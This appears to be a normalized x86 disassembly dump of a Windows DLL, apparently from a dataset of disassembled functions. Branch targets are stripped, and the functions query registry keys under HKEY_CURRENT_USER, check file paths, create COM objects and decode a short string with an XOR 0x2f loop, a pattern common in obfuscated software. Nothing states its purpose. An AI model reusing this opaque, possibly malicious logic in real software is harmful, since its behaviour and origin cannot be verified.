lea edx [ ebp - 0x10 ]
xor eax eax
call sub_10038bb0
lea edx [ ebp - 0x48 ]
mov eax 0x8
call sub_10038bb0
mov eax edx
push eax
lea ecx [ ebp - 0xc4 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
mov ecx 0x104
lea ebx [ ebp - 0x8e4 ]
call sub_1006d3c0
push 0x30c
lea eax [ ebp - 0xefc ]
push eax
push 0x0
mov ecx ebx
mov edx 0x80000001
call sub_1006a230
add esp 0x18
test eax eax
jne r-xdata
pop ebx
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0xefc ]
push ecx
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x4
call sub_10038bb0
push 0x30c
lea edx [ ebp - 0xefc ]
push edx
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0xc4 ]
mov edx 0x80000001
call sub_1006a230
add esp 0xc
test eax eax
jne r-xdata
lea edx [ ebp - 0xf0c ]
mov eax 0x7
call sub_10038bb0
lea edx [ ebp - 0xf04 ]
mov eax 0x9
call sub_10038bb0
lea edx [ ebp - 0xf00 ]
mov eax 0x3
call sub_10038bb0
mov ecx edx
push ecx
push esi
call [ StrStrW@IAT ]
lea ecx [ ebp - 0x6dc ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
xor ebx ebx
sub esi ecx
lea ebx [ ebp - 0xf04 ]
xor edi edi
sub ebx ecx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
jne r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0xf00 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x6dc ]
call sub_10050c60
test eax eax
jne r-xdata
pop ebx
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x6dc ]
call sub_10050c60
test eax eax
jne r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0xf00 ]
push ecx
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0xf04 ]
push eax
call sub_10050c60
test eax eax
je r-xdata
push edi
mov esi 0x30c
lea ebx [ ebp - 0x6dc ]
call sub_10050c60
test eax eax
jne r-xdata
lea edx [ ebp - 0xf04 ]
push edx
call sub_10050c60
test eax eax
jne r-xdata
mov edi [ ebp - 0xf08 ]
lea eax [ ebp - 0xf00 ]
push eax
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0xf0c ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x6dc ]
call sub_10050c60
test eax eax
jne r-xdata
lea ecx [ ebp - 0xf04 ]
push ecx
call sub_10050c60
test eax eax
jne r-xdata
lea eax [ ebp - 0xf00 ]
push eax
call sub_10050c60
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10050c60
test eax eax
jne r-xdata
mov edx ebx
push edx
lea eax [ ebp - 0xefc ]
push eax
call [ lstrcmpiW@IAT ]
neg eax
pop ebx
sbb eax eax
pop edi
inc eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10051870
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
cmp edi [ ebp + 0x8 ]
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x14 ]
push ebx
mov ebx [ edx + 0x10 ]
push esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x10
jb r-xdata
mov esi [ edi + 0x10 ]
mov eax esi
cmp eax esi
jae r-xdata
mov edx [ edx ]
mov ecx esi
cmp esi ebx
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov ecx ebx
mov eax edi
mov eax [ edi ]
jmp r-xdata
add edi 0x1c
cmp edi [ ebp + 0x8 ]
jne r-xdata
cmp esi ebx
jb r-xdata
push ecx
push edx
push eax
call sub_100021f0
add esp 0xc
test eax eax
jne r-xdata
mov edx [ ebp + 0xc ]
pop esi
mov eax edi
pop ebx
cmp esi ebx
setne al
test eax eax
je r-xdata
sub_100518e5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub ebx esi
push edi
push esi
push ebx
call sub_10017bd1
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub edi eax
mov eax edi
pop edi
cmp edi eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1000498f
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1000498f
add esp 0x10
inc esi
test edi edi
je r-xdata
sub_100519b0
push ebp
mov ebp esp
push ecx
push 0x0
push eax
or eax 0xffffffff
mov [ ebp - 0x4 ] 0x0
call sub_10063e80
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] cx
push eax
mov ecx edi
call sub_10033f90
mov eax edi
mov esp ebp
pop ebp
retn
sub_100519f0
push ebp
mov ebp esp
push ecx
mov eax edx
push edi
mov [ ebp - 0x4 ] 0x0
lea edi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax edi
sar eax 0x1
push eax
push edx
call sub_10052290
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_10033f90
mov eax esi
pop edi
mov esp ebp
pop ebp
retn
sub_10051a3c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_10051a60
push ebp
mov ebp esp
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
xor ebx ebx
lea edi [ ebp - 0xb0 ]
lea edx [ ebp - 0xb8 ]
mov esi ecx
mov [ ebp - 0xc0 ] eax
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xb0 ] ebx
call sub_1003a120
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov eax 0x9c
mov [ ebp - 0xbc ] ebx
call sub_1002f620
lea ecx [ ebp - 0xbc ]
push ecx
push edx
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xa8 ]
lea eax [ ebx + 0x67 ]
call sub_1002f620
mov ebx 0x1
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax 0x119
mov [ ebp - 0xb4 ] ebx
call sub_1002f620
lea eax [ ebp - 0xb4 ]
push eax
mov ecx edx
push ecx
call sub_1004e270
add esp 0x8
test eax eax
jne r-xdata
mov ebx 0x3
jmp r-xdata
mov edx [ ebp - 0xb8 ]
mov esi [ SysFreeString@IAT ]
push edx
call esi
mov eax [ ebp - 0xb0 ]
push eax
call esi
mov ecx [ ebp - 0xb4 ]
push ecx
call esi
mov edx [ ebp - 0xac ]
push edx
call esi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x2c ]
mov eax 0x10b
mov [ ebp - 0xac ] ebx
call sub_1002f620
lea edx [ ebp - 0xac ]
push edx
lea eax [ ebp - 0x2c ]
push eax
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
push 0x18
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
mov ebx 0x4
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0xac ]
push ecx
call sub_10002bd3
mov edx [ ebp - 0xb4 ]
mov ecx [ ebp - 0xb0 ]
add esp 0x4
push edx
mov edx [ ebp - 0xb8 ]
push ecx
mov ecx [ ebp - 0xbc ]
push edx
call sub_10070150
jmp r-xdata
mov ecx [ ebp - 0xc0 ]
mov [ ecx ] eax
sub_10051bd7
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x7f3
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001be36
mov ecx [ ebp + 0x20 ]
or [ ecx ] eax
mov eax [ ecx ]
add esp 0x18
test al 0x2
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x20
push esi
mov esi [ ebp - 0x4 ]
mov edx 0x76c
cmp esi edx
jl r-xdata
cmp esi 0x87
jle r-xdata
sub esi edx
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov [ eax + 0x14 ] esi
pop esi
or eax 0x2
mov [ ecx ] eax
sub_10051c40
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push r--data
lea edx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] 0x0
call sub_1001e420
lea eax [ ebp - 0x10 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
add esp 0x8
mov [ esi ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0x10 ]
push ecx
mov ecx esi
call sub_1003e780
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10051ca7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
sub eax [ ebp + 0x8 ]
sar eax 0x1
push eax
push [ ebp + 0x8 ]
push 0x1
call [ GetStringTypeW@IAT ]
mov eax [ ebp + 0xc ]
pop ebp
retn
sub_10051ccd
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x10 ]
mov eax [ ebp + 0x8 ]
cmp eax edx
ja r-xdata
push [ ebp + 0xc ]
sub eax edx
push eax
call sub_10042a70
push 0xffffffff
push eax
call sub_1004ca30
jmp r-xdata
pop ebp
retn 0x8
sub_10051cf5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_1002d269
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_10032de0
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_1002387b
mov [ esi + 0x4 ] eax
sub_10051d7c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x10 ]
fld [ ebp + 0x8 ]
movzx ecx [ ebp + 0xe ]
fstp [ ebp - 0x8 ]
add eax 0x3fe
shl eax 0x4
and ecx 0x800f
or eax ecx
mov [ ebp - 0x2 ] ax
fld [ ebp - 0x8 ]
leave
retn
sub_10051db0
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi edx
lea esi [ edi + 0x1c ]
push esi
push r--data
push 0x1
push 0x0
push r--data
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x40 ] ecx
call [ CoCreateInstance@IAT ]
test eax eax
mov eax 0x1
js r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov edx 0x3
mov [ ebp - 0x50 ] dx
lea edx [ ebp - 0x28 ]
mov [ ebp - 0x30 ] 0x0
call sub_1002f620
mov ecx [ esi ]
mov ebx [ ecx ]
lea eax [ ebp - 0x30 ]
push eax
push 0x0
push edx
mov edx [ ebp - 0x50 ]
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp - 0x4c ]
mov [ eax + 0x4 ] edx
mov edx 0x1
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x44 ]
mov [ eax + 0xc ] edx
mov eax [ ebx + 0xe0 ]
push ecx
call eax
test eax eax
jns r-xdata
mov ebx [ ebp - 0x3c ]
lea ecx [ ebp - 0x30 ]
push ecx
mov [ ebp - 0x2c ] 0x0
call sub_100458d0
test eax eax
je r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx [ ebp - 0x30 ]
xor edi edi
mov [ ebp - 0x34 ] edi
mov edx [ eax ]
mov edx [ edx + 0x54 ]
push ecx
push eax
call edx
test eax eax
jns r-xdata
mov [ ebp - 0x2c ] 0x3
jmp r-xdata
mov eax [ ebp - 0x34 ]
cmp eax edi
je r-xdata
mov [ ebp - 0x2c ] 0x6
jmp r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
je r-xdata
mov esi [ esi ]
mov eax [ esi ]
mov edx [ eax + 0x88 ]
lea ecx [ ebp - 0x38 ]
push ecx
push esi
call edx
test eax eax
jns r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x34 ] edi
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0x40 ]
mov edx [ ebp - 0x38 ]
push eax
call sub_10019010
mov ecx [ ebp - 0x38 ]
push ecx
call [ SysFreeString@IAT ]
mov [ ebp - 0x2c ] 0x4
jmp r-xdata
sub_10051f24
push 0x34
mov eax sub_10085279
call sub_10047689
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x14 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x40 ] eax
mov al [ ebx ]
test al al
je r-xdata
xor esi esi
push esi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] 0x0
call sub_10021130
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x3c ] 0xfffffffe
mov [ ebp - 0x34 ] 0x1
mov cl al
mov edx ebx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005b50
mov eax [ ebp - 0x3c ]
call sub_100262c3
retn
mov al [ edi + ebx ]
test al al
je r-xdata
inc edx
mov cl [ edx ]
test cl cl
jne r-xdata
inc [ ebp + 0x10 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov cl [ ebx ]
cmp cl al
jne r-xdata
cmp [ eax + esi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
inc edi
mov al [ edi + ebx ]
test al al
jne r-xdata
add edi [ ebp - 0x34 ]
mov al [ edi + ebx ]
cmp al [ ebx ]
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp al cl
je r-xdata
push 0x7f
pop ecx
cmp [ ebp - 0x34 ] ecx
jae r-xdata
test al al
je r-xdata
movsx eax [ eax + esi ]
add edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x34 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_1006995b
test al al
jne r-xdata
inc esi
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov [ ebp - 0x3c ] esi
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x34 ]
cmp ecx 0x7f
jb r-xdata
mov ecx [ ebp - 0x38 ]
cmp [ ecx + 0x4 ] al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push 0x7f
pop ecx
mov al [ edi + ebx ]
cmp al [ ecx + 0x5 ]
jne r-xdata
call sub_1001f91c
mov ecx [ ebp - 0x38 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_1006995b
test al al
jne r-xdata
mov [ eax + esi ] cl
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x38 ]
inc [ ebp - 0x34 ]
call sub_1005f5ef
or [ ebp - 0x3c ] 0xffffffff
jmp r-xdata
xor esi esi
xor edi edi
mov [ ebp - 0x2d ] 0x0
cmp [ ebp + 0x10 ] esi
jbe r-xdata
sub_10052090
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi + 0x1c ] eax
call sub_1007f580
add esp 0xc
pop esi
retn
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x1c ] 0x0
sub_100520cc
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x90 ] eax
mov eax [ esi + 0x1c ]
push edi
mov [ ebp - 0x8c ] ecx
mov ecx [ esi + 0x18 ]
mov edi 0x2000
test eax eax
jg r-xdata
mov ebx ecx
mov [ ebp - 0x8 ] eax
test eax eax
jl r-xdata
jl r-xdata
mov [ ebp - 0x88 ] ebx
push 0x24
pop eax
jg r-xdata
test [ esi + 0x14 ] edi
jne r-xdata
test ecx ecx
jne r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x88 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x0
push eax
push [ ebp - 0x8c ]
call sub_1005aa50
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_1000f103
push eax
push ebx
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x90 ]
push [ ebp - 0x8c ]
call sub_10014c00
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x90 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x1c
fld [ r--data ]
fmul st1
fld st1
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov [ ebp - 0x88 ] eax
jmp r-xdata
cmp ebx eax
jbe r-xdata
push 0x6
pop ecx
xor eax eax
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov eax [ ebp - 0x88 ]
fld [ ebp + 0x1c ]
mov ecx [ esi + 0x14 ]
cdq
sub ebx eax
sbb [ ebp - 0x8 ] edx
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov eax ecx
and eax 0x3000
cmp eax edi
jne r-xdata
mov [ ebp - 0x79 ] 0x0
fxch st1
fxch st1
mov [ ebp - 0x79 ] 0x1
fchs
jmp r-xdata
cmp [ ebp - 0x80 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop edi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
fdiv st2
add [ ebp - 0x80 ] edi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
fchs
jg r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx edi
jb r-xdata
cmp [ ebp - 0x84 ] edx
jae r-xdata
add ebx 0xfffffff6
fmul st1
adc [ ebp - 0x8 ] 0xffffffff
add [ ebp - 0x84 ] edi
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
jge r-xdata
sub_10052290
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
test edx edx
je r-xdata
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x8
jb r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_10030594
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
lea edi [ eax + ebx ]
cmp edi 0x7ffffffe
jbe r-xdata
cmp ecx 0x8
jb r-xdata
cmp edx eax
jb r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_10030594
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10071bf0
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp ecx 0x8
jb r-xdata
mov edi [ esi + 0x10 ]
lea eax [ eax + edi * 2 ]
cmp eax edx
jbe r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
mov eax esi
xor edx edx
pop edi
mov [ eax ] dx
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
pop ebx
xor edx edx
mov [ eax ] dx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx [ ebp + 0xc ]
push ecx
sub edx eax
sar edx 0x1
push edx
push esi
mov ecx esi
call sub_1006da10
pop edi
pop esi
pop ebp
retn 0x8
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
pop ebx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
lea ecx [ ebx + ebx ]
push ecx
push edx
mov edx [ esi + 0x10 ]
lea eax [ eax + edx * 2 ]
push eax
call sub_1007f580
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10052500
push ebp
mov ebp esp
push 0xffffffff
push sub_10087f18
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
xor eax eax
mov [ ebp - 0x38 ] ax
mov eax edi
mov [ ebp - 0x24 ] 0x7
mov [ ebp - 0x28 ] esi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x38 ]
call sub_10034100
mov [ ebp - 0x4 ] esi
mov edx [ ebp - 0x24 ]
mov esi [ ebp - 0x38 ]
mov ecx esi
cmp edx 0x8
jae r-xdata
mov eax esi
jmp r-xdata
lea ecx [ ebp - 0x38 ]
mov eax ecx
mov ebx [ ebp - 0x28 ]
lea ebx [ eax + ebx * 2 ]
mov eax esi
cmp edx 0x8
jae r-xdata
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x38 ]
mov ecx [ r--data ]
xor eax eax
lea esp [ esp ]
push ecx
lea ecx [ ebp - 0x3c ]
push ecx
call sub_1002ffa0
add esp 0x8
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x2f
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0x4
jb r-xdata
xor eax eax
mov [ ebp - 0x14 ] ax
lea eax [ ebp - 0x1c ]
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x1c ]
push ecx
lea edx [ ebp - 0x38 ]
push edx
call sub_10020700
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax edi
lea edx [ eax + 0x2 ]
cmp [ ebp - 0x24 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x38 ]
call sub_10034100
mov ebx [ ebp - 0x24 ]
mov ecx [ ebp - 0x38 ]
mov eax ecx
cmp ebx 0x8
jae r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0x38 ]
push eax
call sub_1000a86e
add esp 0x4
cmp [ eax ] 0x22
mov eax ecx
jne r-xdata
lea eax [ ebp - 0x38 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
cmp ebx 0x8
jae r-xdata
cmp ebx 0x8
jae r-xdata
lea esi [ esi + esi + 0x8 ]
push esi
push eax
push edi
call sub_1007f580
add esp 0xc
xor edx edx
mov [ esi + edi ] dx
lea eax [ ebp - 0x38 ]
lea esi [ esi + esi + 0x6 ]
push esi
add eax 0x2
push eax
push edi
call sub_1007f580
add esp 0xc
xor ecx ecx
mov [ esi + edi ] cx
jmp r-xdata
lea eax [ ebp - 0x38 ]
xor eax eax
mov eax [ ebp - 0x38 ]
push eax
call sub_1000a86e
add esp 0x4
cmp ebx 0x8
jb r-xdata
sub_100526b0
push 0x4c
mov eax sub_10085a52
call sub_10047689
mov eax [ ebp + 0x20 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0x24 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
mov esi ecx
mov ecx [ ebp + 0x28 ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x50 ] ecx
push eax
mov ecx esi
mov [ ebp - 0x58 ] ebx
call sub_1001a865
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
or [ edi ] 0x1
add esi 0x8
push esi
push 0x0
push 0x30
call sub_10030ff0
xor esi esi
add esp 0xc
movzx ebx ax
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] 0x0
push [ ebp - 0x1c ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_10053fd0
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
or [ edi ] 0x2
jmp r-xdata
cmp [ eax ] bx
jb r-xdata
lea eax [ ebp - 0x2c ]
